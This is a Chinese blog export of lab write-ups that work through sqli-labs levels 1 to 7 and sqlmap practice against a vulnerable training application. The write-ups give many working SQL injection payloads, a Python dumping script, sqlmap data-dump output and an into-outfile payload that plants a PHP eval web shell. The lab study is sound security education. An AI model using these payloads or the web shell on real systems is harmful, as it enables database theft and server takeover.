<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[sqli-labs-Less-5-7]]></title>
    <url>%2F2018%2F04%2F20%2Fsqli-labs-Less-5-6%2F</url>
    <content type="text"><![CDATA[Less-5 GET- Double Query-Single Quotes -String基于get请求的双查询的单引号字符型注入什么叫双查询？双查询又可以叫做嵌套子查询，相当于在select语句中还有一个select语句，而里面的select语句称为子查询 select(select) 双查询你注入当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。 函数 功能 count(*) 统计表中所有记录的个数 count(列名) 统计一列中值的个数，其中重复的记录也会被当做有效的记录。 count(distinct 列名) 统计一列中值的个数，其中重复的记录只会被记录一次。 sum(列名) 计算一列值的总和。 avg(列名) 计算一列值的平均值。 max(列名) 计算一列值中的最大值。 min(列名) 计算一列值中的最小值。 rand() 生成0-1之间的小数随机值 floor() 只返回整数部分，小数部分舍弃 round() 函数四舍五入，大于0.5的部分进位，不到则舍弃 concat() 连接函数，可以连接多个字符 group by 将结果以分组的形式返回 什么时候使用双查询注入？适用于注入时没有显示位，但是在有显示位的时候同样适用，有显示位时不建议。双查询注入语句的固定格式 union select 1 from (select+count(*),concat(floor(rand(0)*2),( 注入爆数据语句))a from information_schema.tables group by a)b 测试sqli-labs/Less-5/?id=1 返回如下，与之前不同 Welcome Dhakkan You are in........... 构造payloadselect count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a; 分析：0x3a 表示冒号，rand()2 返回 0-2之间的随机数，floor(rand()2)返回整数0或1。 concat()将返回 ::关键信息::0或者::关键信息::1 字段数sqli-labs/Less-5/?id=1&apos; order by 6 %23 返回错误 sqli-labs/Less-5/?id=1&apos; order by 5%23 返回正确 数据库基本信息sqli-labs/Less-5/?id=1&apos; union select 1,2,3,count(*) ,concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a%23 返回 Welcome Dhakkan Duplicate entry &apos;::security::1&apos; for key &apos;group_key&apos; 当前数据库名 sqli-labs/Less-5/?id=1&apos; union select 1,2,3,count(*) ,concat(0x3a,0x3a,version(),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a%23 版本号 Duplicate entry &apos;::5.5.53::0&apos; for key &apos;group_key&apos; 读取信息数据库名(改变 limit 1,1的值获取所有的)sqli-labs/Less-5/?id=1&apos; union select 1 from (select+count(*),concat(floor(rand(0)*2),( select schema_name from information_schema.schemata limit 1,1) )a from information_schema.tables group by a)b %23 表名sqli-labs/Less-5/?id=1&apos; union select 1 from (select+count(*),concat(floor(rand(0)*2),( select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1) )a from information_schema.columns group by a)b %23 列名sqli-labs/Less-5/?id=1&apos; union select 1 from (select+count(*),concat(floor(rand(0)*2),( select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1) )a from information_schema.columns group by a)b %23 数据sqli-labs/Less-5/?id=1&apos; union select 1 from (select+count(*),concat(floor(rand(0)*2),( select password from security.users limit 0,1) )a from information_schema.columns group by a)b %23 python 小脚本用来爆破(limit太麻烦)#!/usr/bin/python #-*-encoding:utf-8-*- import requests import re url = &quot;http://192.168.83.134/sqli-labs/Less-5/&quot; #获取数据 def getData(url,payload,file_name): files = open(file_name,&apos;a&apos;) #print url+payload r = requests.get(url+payload) html = r.text #print html data = re.findall(r&apos;::\w{0,20}::&apos;,html) for i in data: files.write(i) files.close() #获取所有数据库名 def getDatabaseName(): filename = &apos;file_databasename.txt&apos; for i in range(0,20): payload_databases = &apos;?id=1\&apos; union select 1 from (select+count(*),concat(0x3a,0x3a,( select schema_name from information_schema.schemata limit %s,1),0x3a,0x3a,floor(rand(0)*2) )a from information_schema.tables group by a)b %%23&apos; % i getData(url,payload_databases,filename) #获取某个数据库的所有表名 def getTableName(databasename): filename = &apos;file_tablename.txt&apos; for i in range(0,20): payload_tables = &apos;?id=1\&apos; union select 1 from (select+count(*),concat(0x3a,0x3a,( select table_name from information_schema.tables where table_schema=%s limit %s,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b %%23&apos; % (databasename, i) getData(url,payload_tables,filename) #获取某个表中的所有字段名 def getColumnName(tablename): filename = &apos;file_columnname.txt&apos; for i in range(0,20): payload_columns = &apos;?id=1\&apos; union select 1 from (select+count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name= %s limit %s,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b %%23&apos; % (tablename,i) getData(url,payload_columns,filename) #获取某个表中的数据 def getColumnData(databasename,tablename,columnname): filename = columnname+&apos;_data.txt&apos; for i in range(0,20): payload_columndata = &apos;?id=1\&apos; union select 1 from (select+count(*),concat(0x3a,0x3a,(select %s from %s.%s limit %s,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b %%23&apos; % (columnname,databasename,tablename,i) getData(url,payload_columndata,filename) if __name__ == &apos;__main__&apos;: #获取数据库中所有的数据库名 print &apos;获取数据库中所有数据库名&apos; getDatabaseName() #获取security数据库的所有表 print &apos;获取security数据库的所有表&apos; databasename = &quot;&apos;security&apos;&quot; getTableName(databasename) #获取表中的字段名 print &apos;获取users表的所有字段名&apos; tablename = &quot;&apos;users&apos;&quot; getColumnName(tablename) #获取users表的username和password print &apos;获取users表的username&apos; databasename = &apos;security&apos; tablename = &apos;users&apos; columnname = &apos;username&apos; getColumnData(databasename,tablename,columnname) 输出四个文本：file_columnname.txt file_databasename.txt file_tablename.txt cat file_databasename.txt file_tablename.txt file_columnname.txt username_data.txt ::information_schema::::challenges::::mysql::::performance_schema::::security::::test:: ::emails::::referers::::uagents::::users:: ::id::::username::::password::::first_name::::last_name:: ::Dumb::::Angelina::::Dummy::::secure::::stupid::::superman::::batman::::admin::::admin1::::admin2::::admin3::::dhakkan::::admin4:: 有些地方还是使用了硬编码不够灵活，使用burpsuit的intruct模块爆破更快 Less-6 GET- Double Query-Double Quotes -String基于get方法请求的双引号双查询字符注入Less-6与Less-5基本一致，只要报单引号改为双引号即可，不再赘述。GET-Dump into outfile - String基于get方法的导出文件的字符型注入mysql导出数据的方法select ... into outfile &apos;filename&apos; select可以把被选择的行写入一个文件中，该文件被创建到服务器主机上，因此必须拥有file权限；输出不能是一个已存在的文件，防止文件数据被篡改；在unix中该文件被创建后是可读的，权限有MySQL服务器所有，只能读不能删除。 源码分析$sql=&quot;SELECT * FROM users WHERE id=((&apos;$id&apos;)) LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in.... Use outfile......&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;; echo &apos;You have an error in your SQL syntax&apos;; //print_r(mysql_error()); echo &quot;&lt;/font&gt;&quot;; } } else { echo &quot;Please input the ID as parameter with numeric value&quot;;} 参数id被单引号和双层括号包裹，正确时显示 You are in…. Use outfile….. 错误时显示 You have an error in your SQL syntax; 构造payloadsqli-labs/Less-7/?id=1&apos;)) %23 sqli-labs/Less-7/?id=1&apos;)) order by 6%23 返回错误 sqli-labs/Less-7/?id=1&apos;)) order by 5%23 返回正常 读写权限测试sqli-labs/Less-7/?id=1&apos;)) and (select count(*) from mysql.user)&gt;0 %23 返回正常，说明具有读写权限 数据库路径和安装路径使用Less-5或Less-6的双查询注入方法发现不起作用对比了源代码后才知道在Less-7中把报错显示注释掉了。 //print_r(mysql_error()); 本来使用 @@basedir 和 @@datadir来查询安装路径和数据库路径这里查询不了，总之前的关卡可知 C:/phpStudy/MySQL/和C:\phpStudy\MySQL\data\推测出目录路径为C:\phpStudy\WWW\sqli-labs\Less-7\ 这里在测试的过程中把报错的注释去掉了，可以看到一个Mysql配置问题 --secure-file-priv option so it cannot execute this statement 在MySQL的目录下的一个my.ini的文件中添加secure_file_priv = 路径重启后执行成功 sqli-labs/Less-7/?id=1&apos;)) union select 1,2,version(),4,5 into outfile &quot;C:/phpStudy/WWW/sqli-labs/Less-7/1.txt&quot; %23 直接访问 http://192.168.83.134/sqli-labs/Less-7/1.txt 可以看到之前写的数据，试着写入一句话 sqli-labs/Less-7/?id=1&apos;)) union select 1,2,&apos;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&apos;,4,5 into outfile &quot;C:/phpStudy/WWW/sqli-labs/Less-7/shell.php&quot; %23 写入成功后，能够直接访问，使用中国菜刀直接连接即可 参考：【科普文】双查询注入 Double SQL Injection(双查询注入)]]></content>
      <tags>
        <tag>sql注入</tag>
        <tag>sqli-labs</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap使用练习]]></title>
    <url>%2F2018%2F04%2F19%2Fsqlmap%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[使用sqli-labs练习社区sqlmap（mysql） 漏洞源代码下载：https://github.com/Audi-1/sqli-labs 工具注入(sqlmap)简单测试 (-u url)sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --level 3 [*] starting at 15:33:02 [15:33:02] [INFO] resuming back-end DBMS &apos;mysql&apos; [15:33:02] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: id (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: id=1&apos; AND 1906=1906-- PKiX Type: error-based Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: id=1&apos; AND (SELECT 6992 FROM(SELECT COUNT(*),CONCAT(0x7162786271,(SELECT (ELT(6992=6992,1))),0x7162766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- yOBo Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: id=1&apos; AND SLEEP(5)-- PmIF Type: UNION query Title: Generic UNION query (NULL) - 5 columns Payload: id=-3918&apos; UNION ALL SELECT NULL,CONCAT(0x7162786271,0x58716e444643434d644b55716c6477776464456e4673725a4b65444771624356436a56647a76586b,0x7162766a71),NULL,NULL,NULL-- eMQX --- [15:33:03] [INFO] the back-end DBMS is MySQL web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 注：-v(–level) 3 同时显示注入的payload 列出数据库系统的数据库(–dbs)sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --dbs web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 [14:51:37] [INFO] fetching database names [14:51:38] [INFO] the SQL query used returns 6 entries [14:51:39] [INFO] retrieved: information_schema [14:51:41] [INFO] retrieved: challenges [14:51:42] [INFO] retrieved: mysql [14:51:43] [INFO] retrieved: performance_schema [14:51:44] [INFO] retrieved: security [14:51:45] [INFO] retrieved: test available databases [6]: [*] challenges [*] information_schema [*] mysql [*] performance_schema [*] security [*] test 列出数据库表(–tables -D 数据库名，若无-D参数则显示数据库中所有表)sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --tables -D &apos;security&apos; web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 [15:03:02] [INFO] fetching tables for database: &apos;security&apos; [15:03:03] [INFO] the SQL query used returns 4 entries [15:03:04] [INFO] retrieved: emails [15:03:05] [INFO] retrieved: referers [15:03:06] [INFO] retrieved: uagents [15:03:07] [INFO] retrieved: users Database: security [4 tables] +----------+ | emails | | referers | | uagents | | users | +----------+ 列出数据库中的列(–column -T 表名 -D 数据库名 若无-D参数则默认当前数据库)sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --column -T &apos;users&apos; -D &apos;security&apos; web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 [15:08:34] [INFO] fetching columns for table &apos;users&apos; in database &apos;security&apos; [15:08:36] [INFO] the SQL query used returns 5 entries [15:08:37] [INFO] retrieved: &quot;id&quot;,&quot;int(3)&quot; [15:08:38] [INFO] retrieved: &quot;username&quot;,&quot;varchar(20)&quot; [15:08:39] [INFO] retrieved: &quot;password&quot;,&quot;varchar(20)&quot; [15:08:40] [INFO] retrieved: &quot;first_name&quot;,&quot;varchar(8)&quot; [15:08:41] [INFO] retrieved: &quot;last_name&quot;,&quot;varchar(8)&quot; Database: security Table: users [5 columns] +------------+-------------+ | Column | Type | +------------+-------------+ | first_name | varchar(8) | | id | int(3) | | last_name | varchar(8) | | password | varchar(20) | | username | varchar(20) | +------------+-------------+ 获取整某张表的信息(–dump -C column1，column2 -T tablename -D databasename )sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --dump -C &apos;username&apos;,&apos;password&apos; -T &apos;users&apos; -D &apos;security&apos; web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 [15:19:18] [INFO] fetching entries of column(s) &apos;password, username&apos; for table &apos;users&apos; in database &apos;security&apos; [15:19:18] [INFO] the SQL query used returns 13 entries [15:19:19] [INFO] retrieved: &quot;Dumb&quot;,&quot;Dumb&quot; [15:19:20] [INFO] retrieved: &quot;I-kill-you&quot;,&quot;Angelina&quot; [15:19:21] [INFO] retrieved: &quot;p@ssword&quot;,&quot;Dummy&quot; [15:19:22] [INFO] retrieved: &quot;crappy&quot;,&quot;secure&quot; [15:19:23] [INFO] retrieved: &quot;stupidity&quot;,&quot;stupid&quot; [15:19:24] [INFO] retrieved: &quot;genious&quot;,&quot;superman&quot; [15:19:25] [INFO] retrieved: &quot;mob!le&quot;,&quot;batman&quot; [15:19:26] [INFO] retrieved: &quot;admin&quot;,&quot;admin&quot; [15:19:27] [INFO] retrieved: &quot;admin1&quot;,&quot;admin1&quot; [15:19:29] [INFO] retrieved: &quot;admin2&quot;,&quot;admin2&quot; [15:19:30] [INFO] retrieved: &quot;admin3&quot;,&quot;admin3&quot; [15:19:31] [INFO] retrieved: &quot;dumbo&quot;,&quot;dhakkan&quot; [15:19:32] [INFO] retrieved: &quot;admin4&quot;,&quot;admin4&quot; [15:19:32] [INFO] analyzing table dump for possible password hashes Database: security Table: users [13 entries] +----------+------------+ | username | password | +----------+------------+ | Dumb | Dumb | | Angelina | I-kill-you | | Dummy | p@ssword | | secure | crappy | | stupid | stupidity | | superman | genious | | batman | mob!le | | admin | admin | | admin1 | admin1 | | admin2 | admin2 | | admin3 | admin3 | | dhakkan | dumbo | | admin4 | admin4 | +----------+------------+]]></content>
      <tags>
        <tag>sqli-labs</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs_Less_1-4]]></title>
    <url>%2F2018%2F04%2F19%2Fsqli-labs-Less-1-4%2F</url>
    <content type="text"><![CDATA[sqli-labs练习SQL注入（mysql） 漏洞源代码下载：https://github.com/Audi-1/sqli-labs 手工注入(hackbar)Less-1 Get-Error-Single quotes-String从标题可以知是基于get请求方法的单引号字符报错 页面提示输入数字型参数 id /sqli-labs/Less-1/?id=1 返回正常页面 Welcome Dhakkan Your Login name:Dumb Your Password:Dumb 加一个单引号测试 sqli-labs/Less-1/?id=1&apos; 页面报错 Welcome Dhakkan You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1 从外层依次去掉闭合的单引号可以看到只剩下 1’ ,可知为字符型注sql注入（字符型和数字型的区别会在Less-2后区分）。 构造payload在这里使用 # 或– 注释掉多余的部分（当然，这里也可以使用其他方法闭合这个单引号），对#进行了url编码，构造好使其正常返回。 sqli-labs/Less-1/?id=1&apos; %23 返回正常 猜测字段数（order by ）使用联合查询 (union select)首先使用order by 进行字段数猜测 sqli-labs/Less-1/?id=1&apos; order by 10%23 返回错误 ：Unknown column ‘10’ in ‘order clause’ sqli-labs/Less-1/?id=1&apos; order by 5%23 返回正常 sqli-labs/Less-1/?id=1&apos; order by 6%23 返回错误可知字段数为 5 找到显示位sqli-labs/Less-1/?id=-1&apos; union select 1,2,3,4,5%23 这里注意把id的值设置为一个错误的值，这里设置为了-1可知显示位在 2，3 Welcome Dhakkan Your Login name:2 Your Password:3 查看目标数据库基本信息sqli-labs/Less-1/?id=-1&apos; union select 1,version(),user(),4,5%23 返回如下 Welcome Dhakkan Your Login name:5.5.53 Your Password:root@localhost 函数 功能 database() 返回当前数据库名 security user() 返回当前数据库连接使用的数据库 security version() 返回当前数据库的版本 5.5.53 system_user() 查询系统用户名 root@localhost session_user() 连接数据库的用户名 root@localhost current_user() 查询当前用户名 root@localhost @@version_compile_os 查询数据库操作系统 Win32 @@datadir 查询数据库路径 C:\phpStudy\MySQL\data\ @@basedir 查询MySQL路径 C:/phpStudy/MySQL/ 注：MySQL在5.xx版本以上有个information_schema数据库，该数据库记录了当前数据库的所有数据库、表、列、用户权限等信息，其中SCHEMATA 表存储MySQL所有数据库的基本信息，包括数据库名、编码类型路径等，show databases;结果取自此表；TABLE表存储MySQL中的表信息，show tables from schemaname;的结果取自此表；COLUMNS表：提供了表的列信息，show columns from schemaname.tablename;的结果取自此表 可得到该数据库基本信息 版本：5.5.53 用户：root@localhost 当前数据库名： security 获取数据库中的信息（database，table，column）获取数据库sqli-labs/Less-1/?id=-1&apos; union all select 1,2, schema_name,4,5 from information_schema.schemata %23 返回了数据库 information_schema,一般MySQL中不止一个数据库，可以在加个limit 1,1第一个1表示从那里开始，第二个1表示几个，可以通过不断更改第一个数来显示数据库 sqli-labs/Less-1/?id=-1&apos; union all select 1,2, schema_name,4,5 from information_schema.schemata limit 2,1%23 当然更简单的方法是使用group_concat()一次性返回所有的 sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(schema_name),4,5 from information_schema.schemata %23 返回：information_schema,challenges,mysql,performance_schema,security,testsecurity为需要查找的数据库 获取表sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema=&apos;security&apos; %23 或者 sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema=0x7365637572697479 %23 返回：emails,referers,uagents,users 注意：security是字符串要使用单引号包裹，或者将其转为十六进制，数值类型不需要单引号（有时可能会过滤掉单引号） 获取列sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(column_name),4,5 from information_schema.columns where table_name=&apos;users&apos; %23 返回：id,username,password,first_name,last_name 获取数据到这里我们已经知道了数据库名security,表名users,列名id,username,password,first_name,last_name sqli-labs/Less-1/?id=-1&apos; union all select 1, group_concat(username),group_concat(password),4,5 from security.users %23 返回 Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 Less-2 GET-Error based-Intiger based基于get请求方法的整形注入根据页面提示可知为数字型参数 id sqli-labs/Less-2/?id=1 页面返回 Welcome Dhakkan Your Login name:Dumb Your Password:Dumb 添加一个单引号后 sqli-labs/Less-2/?id=1&apos; 页面返回错误 Welcome Dhakkan You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos; LIMIT 0,1&apos; at line 1 从外层逐层去掉闭合单引号发现只剩下一个单引号 ，可以判断为数字型sql注入。 构造payloadLess-2/?id=1 %23 数字型直接把后面的注释掉即可 sqli-labs/Less-2/?id=1 order by 6 %23 报错 sqli-labs/Less-2/?id=1 order by 5 %23 正常 sqli-labs/Less-2/?id=-1 union select 1,2,3,4,5 %23 显示位 2，3 sqli-labs/Less-2/?id=-1 union select 1,version(),database(),4,5 %23 版本：5.5.53 数据库：security sqli-labs/Less-2/?id=-1 union select 1,2, group_concat(schema_name),4,5 from information_schema.schemata %23 返回所有的数据库 sqli-labs/Less-2/?id=-1 union select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema=&apos;security&apos; %23 返回security数据库的所有表名 sqli-labs/Less-2/?id=-1 union all select 1,2, group_concat(column_name),4,5 from information_schema.columns where table_name=&apos;users&apos; %23 返回users表的所有列名 sqli-labs/Less-2/?id=-1 union all select 1, group_concat(username),group_concat(password),4,5 from security.users %23 返回users表中的username和password字段的值 以上payload与Less-1相似 字符型注入和数字型注入的区别Less-1 字符型 id=’$id’ $sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;; Less-2 数字型 id=$id $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; 加了一个单引号的报错结果 字符型：&apos;&apos;1&apos;&apos; LIMIT 0,1&apos; 从外逐层去掉成对的单引号 1&apos; 数字型：&apos;&apos; LIMIT 0,1&apos; 从外逐层去掉成对的单引号 &apos; 如果没有报错显示：test1不报错,test2报错为字符型 test1 sqli-labs/Less-1/?id=1&apos; or &apos;1&apos;=&apos;2 test2 sqli-labs/Less-1/?id=1&apos; or &apos;1&apos;=2 对比可知：字符型使用单号包裹，数字型无；加了一个单引号后可以看到提交的参数被单引号包裹；以及上面测试的结果判断。 Less-3 GET-Error-Single quotes with twist-string基于get请求方法的带括号的单引号字符型报错注入测试sqli-labs/Less-3/?id=1&apos; 返回 near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1 分析发现是在 Less-1的基础上加了括号 构造payloadsqli-labs/Less-3/?id=1&apos;) %23 返回正常,这里看一下源码就更好理解了 $sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;; 按照之前的思路测试即可sqli-labs/Less-3/?id=1&apos;) order by 6 %23 返回错误 sqli-labs/Less-3/?id=1&apos;) order by 5 %23 返回正常 sqli-labs/Less-3/?id=-1&apos;) union all select 1,2,3,4,5 %23 可知 2，3回显 Less-4 Get-Error based- Double Quotes-string基于get请求方法的双引号报错注入测试sqli-labs/Less-4/?id=1&apos; 页面正常没有任何异常（这里加了单引号没作用），加一个双引号 sqli-labs/Less-4/?id=1&quot; 返回 near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1 从外逐层去掉成对的双引号和单引号 ，我们发现情况与Less-3类似，只是单引号换成双引号。 构造payloadsqli-labs/Less-4/?id=1&quot;) %23 返回正常 按照之前的思路即可sqli-labs/Less-4/?id=1&quot;) order by 6%23 sqli-labs/Less-4/?id=1&quot;) order by 5%23 sqli-labs/Less-4/?id=-1&quot;) union select 1,2,3,4,5%23]]></content>
      <tags>
        <tag>sql注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
</search>
